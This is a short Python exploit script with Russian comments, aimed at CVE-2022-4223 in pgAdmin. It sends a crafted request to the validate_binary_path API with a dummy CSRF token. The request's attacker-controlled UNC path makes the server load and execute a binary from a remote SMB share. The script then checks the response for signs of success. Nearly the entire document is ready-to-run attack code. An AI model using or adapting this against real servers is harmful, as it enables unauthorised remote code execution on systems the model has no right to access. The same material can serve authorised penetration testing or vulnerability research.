#!/usr/bin/env python3
"""
Эксплойт для CVE-2022-4223 в pgAdmin (Pre-Auth RCE через API validate_binary_path).
Использование: python3 exploit_pgadmin.py http://172.20.0.107:5050 \\\\172.20.0.10\\share
"""

import requests
import sys
import json

def exploit_pgadmin(target_url, unc_path):
    """
    Отправляет запрос к уязвимому API pgAdmin.
    target_url: базовый URL pgAdmin (например, http://172.20.0.107:5050)
    unc_path: контролируемый UNC-путь (например, \\\\172.20.0.10\\share)
    """
    headers = {
        'Content-Type': 'application/json',
        'X-pgA-CSRFToken': '1',  # Иногда требуется любой CSRF-токен
        'Referer': f'{target_url}/browser/'
    }
    
    payload = {
        'utility_path': unc_path
    }
    
    try:
        response = requests.post(
            f'{target_url}/misc/validate_binary_path',
            headers=headers,
            json=payload,
            timeout=10,
            verify=False
        )
        
        print(f'[*] Отправлен payload: {json.dumps(payload)}')
        print(f'[*] Статус ответа: {response.status_code}')
        if response.text:
            print(f'[*] Ответ сервера: {response.text[:200]}...')
        
        # Проверяем косвенные признаки успеха
        if response.status_code == 200 and 'version' in response.text.lower():
            print('[+] Запрос успешно обработан. Вероятно, уязвимость существует.')
        else:
            print('[!] Получен неожиданный ответ. Проверьте наличие SMB-трафика.')
            
    except requests.exceptions.RequestException as e:
        print(f'[-] Ошибка соединения: {e}')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f'Использование: {sys.argv[0]} <target_url> <unc_path>')
        print(f'Пример: {sys.argv[0]} http://172.20.0.107:5050 \\\\\\\\172.20.0.10\\\\\\\\share')
        sys.exit(1)
    
    exploit_pgadmin(sys.argv[1], sys.argv[2])